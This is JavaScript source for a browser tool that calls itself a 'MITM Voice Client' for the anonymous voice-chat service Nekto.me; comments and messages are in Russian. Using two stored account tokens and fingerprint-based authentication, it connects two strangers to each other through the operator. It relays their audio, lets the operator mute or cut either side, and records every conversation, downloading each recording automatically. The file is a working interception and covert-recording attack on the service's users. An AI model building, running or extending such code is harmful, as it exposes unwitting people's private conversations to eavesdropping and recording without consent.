/**
 * Forgotten Society Clone - Clean & Fixed Source
 * MITM Voice Client for Nekto.me
 * Fixes: Socket init, dynamic search criteria, logging, UI logic.
 */

// === Configuration ===
const API_ENDPOINT = window.location.origin;
const allowedOrigins = [
    'http://localhost:8000',
    'http://127.0.0.1:8000',
    'https://forgotten-society.com'
];

// === Fingerprint Initialization ===
const fpPromise = import('./lib/fp.js')
    .then(FingerprintJS => FingerprintJS.load())
    .catch(err => {
        console.error('[FP] Ошибка загрузки FingerprintJS:', err);
        return null;
    });

// === UI Elements ===
const screens = {
    welcome: document.getElementById('welcome-screen'),
    options: document.getElementById('options-screen'),
    call: document.getElementById('call-screen'),
    end: document.getElementById('end-screen'),
    waiting: document.getElementById('waiting-screen'),
    warning: document.getElementById('warning-screen'),
    microphoneError: document.getElementById('microphone-error-screen'),
    token: document.getElementById('token-screen'),
    tokenFail: document.getElementById('token-fail-screen')
};

const buttons = {
    start: document.querySelector('.start-button'),
    init: document.querySelector('.init-button'),
    saveDialog: document.getElementById('save-dialog'),
    back: document.querySelectorAll('.back-button'),
    backToOptions: document.querySelectorAll('.back-to-options-btn'),
    backAutoRestart: document.getElementById('back-auto-restart'),
    mute: document.getElementById('mute-btn'),
    restart: document.getElementById('restart-btn'),
    saveAudio: document.getElementById('save-audio-btn'),
    saveTokens: document.getElementById('save-btn'),
    restartDialog: document.querySelector('.restart-button')
};

const inputs = {
    firstToken: document.getElementById('first-token-input'),
    secondToken: document.getElementById('second-token-input'),
    firstTokenInput: document.getElementById('first-token-input'),
    secondTokenInput: document.getElementById('second-token-input'),
    // Search criteria inputs
    sex1: document.getElementById('sex-1'),
    wishSex1: document.getElementById('wish-sex-1'),
    age1: document.getElementById('age-1'),
    sex2: document.getElementById('sex-2'),
    wishSex2: document.getElementById('wish-sex-2'),
    age2: document.getElementById('age-2')
};

const switches = {
    autorestart: document.getElementById('switch-autorestart'),
    refind: document.getElementById('switch-refind')
};

const timerEl = document.querySelector('.timer');
const callContainer = document.querySelector('.call-container');

// === Utility Classes ===

class Timer {
    constructor(element) {
        this.el = element;
        this.interval = null;
        this.tsp = null;
        this.reset();
    }

    start() {
        if (this.interval) return;
        this.tsp = new Date();
        this.el.textContent = '00:00';
        this.interval = setInterval(() => {
            const diff = Math.floor((new Date() - this.tsp) / 1000);
            const m = String(Math.floor(diff / 60)).padStart(2, '0');
            const s = String(diff % 60).padStart(2, '0');
            this.el.textContent = `${m}:${s}`;
        }, 1000);
    }

    stop() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
    }

    reset() {
        this.stop();
        this.tsp = null;
        this.el.textContent = '00:00';
    }
}

class EventTarget {
    constructor() { this.listeners = {}; }
    addEventListener(type, cb) {
        if (!this.listeners[type]) this.listeners[type] = new Set();
        this.listeners[type].add(cb);
    }
    removeEventListener(type, cb) { this.listeners[type]?.delete(cb); }
    dispatchEvent(type, data = null) {
        this.listeners[type]?.forEach(cb => cb(data));
    }
}

// === Audio Classes ===

class MediaSubscriber extends EventTarget {
    constructor() {
        super();
        this.context = new AudioContext();
        this.gain = this.context.createGain();
        this.output = this.context.createMediaStreamDestination();
        this.gain.connect(this.output);
    }

    subscribeStream(stream) {
        const source = this.context.createMediaStreamSource(stream);
        source.connect(this.gain);
    }
}

class CallElement {
    constructor() {
        this.mainEl = document.createElement('div');
        this.mainEl.className = 'call-element';
        
        this.avatar = document.createElement('img');
        this.avatar.className = 'avatar';
        
        const avatarIndex = Math.floor(Math.random() * 3);
        this.avatar.src = `assets/avatars/avatar-${avatarIndex}.png`;
        this.avatar.onerror = () => {
            console.warn(`[Avatar] Файл avatar-${avatarIndex}.png не найден, используем заглушку`);
            this.avatar.src = `https://placehold.co/80x80/00ff88/000000?text=${avatarIndex}`;
        };
        
        this.statusEl = document.createElement('div');
        this.statusEl.className = 'status';
        this.statusEl.textContent = 'Ожидание...';
        
        this.muteIcon = document.createElement('i');
        this.muteIcon.className = 'mute-icon hidden';
        this.muteIcon.textContent = '🔇';
        
        this.mainEl.append(this.avatar, this.statusEl, this.muteIcon);
        this.createMenu();
    }

    createMenu() {
        this.menu = document.createElement('div');
        this.menu.className = 'context-menu hidden';
        
        const btnMute = document.createElement('button');
        btnMute.textContent = '🔇 Выключить звук';
        btnMute.onclick = () => this.dispatchEvent('mute');
        
        const btnSound = document.createElement('button');
        btnSound.textContent = '🔊 Включить звук';
        btnSound.onclick = () => this.dispatchEvent('sound');
        
        const btnLags = document.createElement('button');
        btnLags.textContent = '📊 Лаги';
        btnLags.onclick = () => this.dispatchEvent('lags');
        
        const btnDisconnect = document.createElement('button');
        btnDisconnect.textContent = '❌ Отключить';
        btnDisconnect.className = 'danger';
        btnDisconnect.onclick = () => this.dispatchEvent('disconnect');
        
        this.menu.append(btnMute, btnSound, document.createElement('hr'), btnLags, btnDisconnect);
        document.body.appendChild(this.menu);
        
        this.mainEl.addEventListener('contextmenu', e => {
            e.preventDefault();
            this.menu.classList.remove('hidden');
            this.menu.style.left = e.pageX + 'px';
            this.menu.style.top = e.pageY + 'px';
        });
        
        document.addEventListener('click', () => {
            this.menu.classList.add('hidden');
        });
    }

    changeState(text) { this.statusEl.textContent = text; }
    toggleMuteIcon(show) { this.muteIcon.classList.toggle('hidden', !show); }
    toggleConnected() { this.mainEl.classList.toggle('connected'); }
    dispatchEvent(type) {
        const event = new CustomEvent(type, { detail: this });
        this.mainEl.dispatchEvent(event);
    }
    addEventListener(type, cb) { this.mainEl.addEventListener(type, cb); }
}

// === Client Classes ===

class BaseClient extends MediaSubscriber {
    constructor(userId) {
        super();
        this.userId = userId;
        this.callEl = new CallElement();
        this.connectionId = null;
        this.searching = false;
        this.stream = null;
        this.muted = false;
        
        this.initSocket();
    }

initSocket() {
    this.io = io('wss://audio.nekto.me', {
        path: '/websocket/',
        transports: ['websocket'],
        query: { token: this.userId }
    });

    this.io.on('connect', () => {
        console.log(`[Socket] ✅ Подключен: ${this.userId?.slice(0, 8)}`);
        this.dispatchEvent('connected');
    });

    // ✅ Лог всех входящих сообщений
    this.io.on('message', data => {
        console.log('[WS] ←', data.type, data);
        this.dispatchEvent(data.type, data);
    });

    // ✅ Лог ошибок подключения
    this.io.on('connect_error', err => {
        console.error('[Socket] ❌ Connect Error:', err.message, err.description);
    });

    // ✅ Лог общих ошибок
    this.io.on('error', err => {
        console.error('[Socket] ❌ Error:', err);
    });

    // ✅ Лог ошибок переподключения
    this.io.on('reconnect_error', err => {
        console.warn('[Socket] ⚠️ Reconnect Error:', err.message);
    });

    this.io.on('reconnect_failed', () => {
        console.error('[Socket] ❌ Reconnect Failed');
    });

    this.io.on('disconnect', reason => {
        console.warn(`[Socket] 🔌 Отключен: ${reason}`);
        this.dispatchEvent('disconnected');
    });

    // ✅ Таймаут регистрации
    setTimeout(() => {
        if (!this.connectionId) {
            console.error(`[Client] ⏰ Таймаут регистрации для ${this.userId?.slice(0, 8)}. Сервер не ответил.`);
            console.warn('💡 Проверьте Origin в Network → WS. Должен быть https://nekto.me');
        }
    }, 5000);
}

register() {
    // ✅ Обязательно объявляем payload
    const payload = {
        type: 'register',
        android: false,
        version: 23,
        userId: this.userId,
        isTouch: false,
        messengerNeedAuth: true,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: navigator.language.split('-')[0]
    };

    console.log(`[Client] 📤 Отправка register для ${this.userId.slice(0, 8)}:`, payload);
    this.io.emit('register', payload);
}

    searchInterlocutor(criteria) {
        if (this.searching) return;
        this.searching = true;
        
        // Логирование поиска
    console.log(`[Search] 🚀 Запуск поиска для ${this.userId.slice(0, 8)}:`, criteria);
        
        this.io.emit('search', {
            type: 'scan',
            peerToPeer: true,
            token: null,
            searchCriteria: criteria
        });
    }

    disconnectPeer() {
        if (this.connectionId) {
            this.io.emit('disconnect-peer', {
                type: 'disconnect-peer',
                connectionId: this.connectionId
            });
            this.connectionId = null;
        }
        this.searching = false;
    }

    toggleMute() {
        if (!this.stream) return;
        const track = this.stream.getAudioTracks()[0];
        if (track) {
            track.enabled = !track.enabled;
            this.muted = !track.enabled;
            this.callEl.toggleMuteIcon(this.muted);
        }
    }
}

class Client extends BaseClient {
    constructor(userId, subscriber) {
        super(userId);
        this.subscriber = subscriber;
        this.peer = null;
        this.initiator = false;
    }

    initSocket() {
        super.initSocket();

        this.io.on('peer-connected', async data => {
            this.connectionId = data.connectionId;
            this.initiator = data.initiator;
            this.callEl.changeState('Соединение...');
            
            if (!screens.call.classList.contains('active')) {
                toggleScreen('call');
            }

            this.peer = new RTCPeerConnection({
                iceServers: JSON.parse(data.params)
            });

            if (this.stream) {
                this.stream.getTracks().forEach(track => {
                    this.peer.addTrack(track, this.stream);
                });
            }

            this.setupPeerEvents();

            if (this.initiator) {
                const offer = await this.peer.createOffer();
                await this.peer.setLocalDescription(offer);
                this.io.emit('peer-to-peer', {
                    type: 'offer',
                    offer: JSON.stringify(offer),
                    connectionId: this.connectionId
                });
            }
        });

        this.io.on('peer-to-peer', async data => {
            if (!this.peer) return;
            if (data.type === 'offer') {
                await this.peer.setRemoteDescription(JSON.parse(data.offer));
                const answer = await this.peer.createAnswer();
                await this.peer.setLocalDescription(answer);
                this.io.emit('peer-to-peer', {
                    type: 'answer',
                    answer: JSON.stringify(answer),
                    connectionId: this.connectionId
                });
            } else if (data.type === 'answer') {
                await this.peer.setRemoteDescription(JSON.parse(data.answer));
            }
        });

        this.io.on('ice-candidate', async data => {
            if (!this.peer) return;
            await this.peer.addIceCandidate(JSON.parse(data.candidate).candidate);
        });

        this.addEventListener('connected', () => this.register());

        this.addEventListener('registered', async data => {
    console.log(`[Client] ✅ Registered получен для ${this.userId.slice(0, 8)}`);
    
    const fp = await fpPromise;
    if (!fp) {
        console.error('[Client] FingerprintJS не загружен');
        return;
    }
    
    const fpResult = await fp.get();
    console.log(`[Client] 🆔 Fingerprint получен:`, fpResult); // ✅ Лог отпечатка

    if (fpResult.components.deviceInfo) {
        delete fpResult.components.deviceInfo.ua;
    }

    const payload = {
        user_id: this.userId,
        internal_id: data.connectionId,
        fpt_payload: JSON.stringify(fpResult.components)
    };

    console.log(`[Client] 📤 Отправка web-auth:`, payload); // ✅ Лог отправки

    const response = await fetch(API_ENDPOINT + '/register', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'content-type': 'application/json' }
    });

            const result = await response.json();
            if (!result) {
                location.reload();
                return;
            }

            this.io.emit('web-auth', {
                web_auth: result.web_auth,
                type: 'web-auth'
            });

            this.io.emit('register', {
                ...result.script,
                type: 'script'
            });
        });
    }

    setupPeerEvents() {
        this.peer.ontrack = event => {
            this.stream = new MediaStream([event.track]);
            this.subscribeStream(this.stream);
            this.io.emit('muted', {
                type: 'muted',
                muted: false,
                connectionId: this.connectionId
            });
            this.callEl.toggleConnected();
        };

        this.peer.onicecandidate = event => {
            if (!this.connectionId || !event.candidate) return;
            this.io.emit('ice-candidate', {
                type: 'ice-candidate',
                candidate: JSON.stringify({
                    candidate: event.candidate.candidate,
                    sdpMid: '0',
                    sdpMLineIndex: 0
                }),
                connectionId: this.connectionId
            });
        };

        this.peer.onconnectionstatechange = () => {
            if (this.peer.connectionState === 'connected') {
                this.io.emit('connection', {
                    type: 'connection',
                    connection: true,
                    connectionId: this.connectionId
                });
            } else if (this.peer.connectionState === 'disconnected') {
                this.callEl.toggleConnected();
                this.dispatchEvent('disconnected');
            }
        };
    }
}

// === Room Class ===

class Room {
    constructor(timer) {
        this.timer = timer;
        this.members = [];
        this.subscriber = new MediaSubscriber();
        this.recorder = null;
        this.chunks = [];
        this.autorestart = false;
        this.refind = false;
        this.timeout = null;
    }

    createRecorder() {
        this.recorder = new MediaRecorder(this.subscriber.output.stream, {
            mimeType: 'audio/webm;codecs=opus'
        });
        this.chunks = [];
        this.recorder.ondataavailable = e => this.chunks.push(e.data);
    }

    addMember(client) {
        if (this.members.length >= 2) return;
        this.members.push(client);
        callContainer.appendChild(client.callEl.mainEl);
    }

    search() {
        console.log('[Room] Запуск поиска для всех клиентов...');
        this.members.forEach((m, i) => {
            const opts = getClientOptions(i);
            console.log(`[Room] Клиент ${i} (${opts.initiator ? 'Leader' : 'Follower'}):`, opts.criteria);
            
            if (opts.initiator) {
                m.searchInterlocutor(opts.criteria);
            }
        });
    }

    restart() {
        if (this.members.length < 2) return;
        this.members.forEach((m, i) => {
            m.callEl.changeState('Поиск...');
            setTimeout(() => {
                const opts = getClientOptions(i);
                if (!opts.initiator && m.connectionId) {
                    m.disconnectPeer();
                    m.searchInterlocutor(opts.criteria);
                }
            }, Math.random() * 5000);
        });
    }

    downloadLastDialog() {
        if (this.chunks.length === 0) {
            alert('Нет записанного диалога');
            return;
        }
        const blob = new Blob(this.chunks, { mimeType: 'audio/webm;codecs=opus' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `dialog-${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
    }

    initMembers(inputStream) {
        if (this.members.length < 2) return;

        for (let i = 0; i < this.members.length; i++) {
            for (let j = 0; j < this.members.length; j++) {
                if (i !== j) {
                    this.members[i].input = this.members[j].subscriber.output.stream;
                }
            }
			
			       this.members[i].addEventListener('registered', () => {
            console.log(`[Room] Клиент ${i} зарегистрирован, запуск поиска...`);
            const opts = getClientOptions(i);
            if (opts.initiator) {
                this.members[i].searchInterlocutor(opts.criteria);
            }
        });

            this.members[i].callEl.changeState('Ожидание...');

            this.members[i].addEventListener('connected', () => {
                if (this.areClientsConnected() && !screens.call.classList.contains('active')) {
                    toggleScreen('call');
                }
            });

            this.members[i].addEventListener('disconnected', () => {
                this.members[i].callEl.toggleConnected();
                if (this.areClientsDisconnected()) {
                    this.timer.stop();
                    this.timer.reset();
                    
                    if (this.autorestart) {
                        toggleScreen('waiting');
                        this.timeout = setTimeout(() => {
                            this.search();
                            this.downloadLastDialog();
                        }, Math.random() * 2000);
                    } else {
                        toggleScreen('end');
                    }
                } else if (this.refind) {
                    const opts = getClientOptions(i);
                    this.members[i].searchInterlocutor(opts.criteria);
                }
            });

            this.members[i].callEl.addEventListener('disconnect', () => {
                this.members[i].disconnectPeer();
            });

            this.members[i].callEl.addEventListener('mute', () => {
                this.members[i].toggleMute();
            });
        }

        this.subscriber.subscribeStream(inputStream);
        this.createRecorder();
        this.recorder.start();
        
        toggleScreen('call');
        this.timer.start();
    }

    areClientsConnected() {
        return this.members.every(m => m.connectionId);
    }

    areClientsDisconnected() {
        return this.members.every(m => !m.connectionId);
    }
}

// === UI Functions ===

function toggleScreen(name) {
    Object.values(screens).forEach(s => s.classList.remove('active'));
    if (screens[name]) {
        screens[name].classList.add('active');
    }
    updateHeaderActive(name);
}

function updateHeaderActive(screenName) {
    document.querySelectorAll('header a').forEach(a => {
        a.classList.toggle('active', a.dataset.screen === screenName);
    });
}

function setTokens(tokens) {
    localStorage.setItem('tokens', JSON.stringify(tokens));
}

function getTokens() {
    const t = localStorage.getItem('tokens');
    return t ? JSON.parse(t) : null;
}

function getClientOptions(index) {
    const sexEl = document.getElementById('search-sex');
    const wishSexEl = document.getElementById('search-wish-sex');
    const ageEl = document.getElementById('search-age');

    // Маппинг значений под оригинал
    const sexMap = { 'M': 'MALE', 'F': 'FEMALE' };
    const wishSexMap = { 'M': 'MALE', 'F': 'FEMALE', 'A': '' }; // Пустая строка = "Не важно"

    return {
        initiator: index === 0,
        criteria: {
            sex: sexMap[sexEl?.value] || 'MALE',
            wish_sex: wishSexMap[wishSexEl?.value] || 'FEMALE',
            age: ageEl?.value || '18,44' // Используйте валидный диапазон
        }
    };
}

function initEventsMuteStream(stream) {
    const track = stream.getAudioTracks()[0];
    track.enabled = false;
    buttons.mute.className = 'bi bi-mic-mute';
    
    buttons.mute.onclick = () => {
        track.enabled = !track.enabled;
        buttons.mute.className = track.enabled ? 'bi bi-mic' : 'bi bi-mic-mute';
    };
}

function addMembersToRoom(tokens) {
    tokens.forEach(t => {
        room.addMember(new Client(t, room.subscriber));
    });
}

async function startApp(button) {
    console.log('[startApp] Запуск...');

    if (!allowedOrigins.includes(location.origin)) {
        console.error('[startApp] Ошибка: Origin не разрешен:', location.origin);
        alert('Запустите сервер и откройте http://localhost:8000');
        toggleLoading(button);
        return;
    }

    toggleLoading(button);
    room.autorestart = switches.autorestart.checked;
    room.refind = switches.refind.checked;

    const tokens = getTokens();
    console.log('[startApp] Токены:', tokens);

    if (!tokens) {
        console.warn('[startApp] Токены не найдены');
        toggleLoading(button);
        toggleScreen('token');
        return;
    }

    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('navigator.mediaDevices не поддерживается. Используйте HTTPS или localhost.');
        }

        console.log('[startApp] Запрос микрофона...');
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        console.log('[startApp] Микрофон получен:', stream);

    if (room.members.length < 2) {
        addMembersToRoom(tokens);
        room.initMembers(stream);
        room.subscriber.subscribeStream(stream);
        initEventsMuteStream(stream);
		room.search();
        }
        
        toggleLoading(button);

    } catch (err) {
        console.error('[startApp] Критическая ошибка:', err);
        toggleLoading(button);
        toggleScreen('microphoneError');
        alert('Ошибка микрофона: ' + err.message + '\n\nПроверьте консоль (F12) для деталей.');
    }
}

function toggleLoading(button) {
    if (!button) return;
    const icon = button.querySelector('.loading-icon');
    
    if (!button.disabled) {
        button.dataset.text = button.innerHTML;
        button.innerHTML = '';
        button.disabled = true;
        
        if (!icon) {
            const loadingIcon = document.createElement('img');
            loadingIcon.src = './assets/icons/loading-icon.svg';
            loadingIcon.className = 'loading-icon';
            loadingIcon.onerror = () => {
                loadingIcon.src = '';
                loadingIcon.textContent = '⏳';
            };
            button.appendChild(loadingIcon);
        }
    } else {
        button.disabled = false;
        button.innerHTML = button.dataset.text || button.innerHTML;
        if (icon) {
            icon.remove();
        }
    }
}

// === Initialization ===

document.addEventListener('DOMContentLoaded', () => {
    const timer = new Timer(timerEl);
    const room = new Room(timer);
    window.room = room;

    const warningBtn = screens.warning.querySelector('.back-button');
    if (warningBtn) {
        let countdown = 2500;
        warningBtn.disabled = true;
        const originalText = warningBtn.textContent;
        
        const timerInterval = setInterval(() => {
            if (countdown <= 0) {
                clearInterval(timerInterval);
                warningBtn.disabled = false;
                warningBtn.textContent = originalText;
            } else {
                warningBtn.textContent = (countdown / 1000).toFixed(1) + ' с.';
                countdown -= 100;
            }
        }, 100);

        warningBtn.onclick = () => {
            toggleScreen('welcome');
        };
    }

    setTimeout(() => {
        toggleScreen('warning');
    }, 500);

    document.querySelectorAll('header a').forEach(link => {
        link.onclick = e => {
            e.preventDefault();
            const screen = link.dataset.screen;
            if (screen === 'logs') {
                alert('Раздел логов в разработке. Логи сохраняются в audio_logs/');
                return;
            }
            if (screen) {
                toggleScreen(screen);
            }
        };
    });

    const microErrorBtn = screens.microphoneError.querySelector('.back-button');
    if (microErrorBtn) {
        microErrorBtn.onclick = () => {
            toggleScreen('welcome');
        };
    }

    buttons.start.onclick = () => {
        startApp(buttons.start);
    };

    buttons.init.onclick = () => {
        startApp(buttons.init);
    };

    buttons.back.forEach(btn => {
        btn.onclick = () => {
            toggleScreen('welcome');
        };
    });

    buttons.backToOptions.forEach(btn => {
        btn.onclick = () => {
            toggleScreen('options');
        };
    });

    if (buttons.saveDialog) {
        buttons.saveDialog.onclick = () => {
            const t1 = inputs.firstToken.value.trim();
            const t2 = inputs.secondToken.value.trim();
            if (t1 && t2 && t1 !== t2) {
                setTokens([t1, t2]);
                alert('Токены сохранены!');
                location.reload();
            } else {
                alert('Введите два разных токена');
            }
        };
    }

if (buttons.saveTokens) {
    buttons.saveTokens.onclick = () => {
        const t1 = inputs.firstTokenInput.value.trim();
        const t2 = inputs.secondTokenInput.value.trim();
        
        // ✅ Добавьте этот лог:
        console.log('[SaveTokens] Клик! t1:', t1, '| t2:', t2, '| Equal:', t1 === t2);

        if (t1 && t2 && t1 !== t2) {
            setTokens([t1, t2]);
            alert('Токены сохранены!');
            location.reload();
        } else {
            alert('Введите два разных токена');
        }
    };
}

    [inputs.firstTokenInput, inputs.secondTokenInput].forEach(input => {
        if (input) {
            input.oninput = () => {
                const t1 = inputs.firstTokenInput.value.trim();
                const t2 = inputs.secondTokenInput.value.trim();
                if (buttons.saveTokens) {
                    buttons.saveTokens.disabled = !(t1 && t2 && t1 !== t2);
                }
            };
        }
    });

    if (buttons.saveAudio) {
        buttons.saveAudio.onclick = () => {
            room.downloadLastDialog();
        };
    }

    if (buttons.restart) {
        buttons.restart.onclick = () => {
            room.restart();
        };
    }

    if (switches.autorestart) {
        switches.autorestart.onchange = () => {
            room.autorestart = switches.autorestart.checked;
        };
    }

    if (switches.refind) {
        switches.refind.onchange = () => {
            room.refind = switches.refind.checked;
        };
    }

    const tokens = getTokens();
    if (tokens) {
        if (inputs.firstToken) inputs.firstToken.value = tokens[0] || '';
        if (inputs.secondToken) inputs.secondToken.value = tokens[1] || '';
    }
});